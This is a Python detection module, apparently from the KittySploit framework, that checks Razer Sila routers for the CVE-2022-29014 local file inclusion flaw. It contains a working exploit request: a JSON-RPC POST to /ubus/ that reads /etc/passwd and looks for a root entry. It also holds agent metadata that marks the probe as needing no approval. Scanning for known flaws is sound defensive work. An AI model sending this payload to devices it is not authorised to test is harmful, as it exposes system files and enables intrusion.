#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Razer Sila Gaming Router 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Razer Sila Gaming Router 2.0.441_api-2.0.418 - Local File Inclusion Detection',
        'description': 'Razer Sila Gaming Router 2.0.441_api-2.0.418 is vulnerable to local file inclusion which could allow attackers to read arbitrary files.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'edb', 'packetstorm', 'razer', 'lfi', 'router', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/50864',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-29014',
            'https://www2.razer.com/ap-en/desktops-and-networking/razer-sila',
            'https://packetstormsecurity.com/files/166683/Razer-Sila-2.0.418-Local-File-Inclusion.html',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-29014',
    }

    def run(self):
        path = '/ubus/'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='{"jsonrpc":"2.0","id":3,"method":"call","params":["4183f72884a98d7952d953dd9439a1d1","file","read",{"path":"/etc/passwd"}]}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='high', reason='Razer Sila Gaming Router 2.0.441_api-2.0.418 - Local File Inclusion detected', path=path)
            return True
        return False

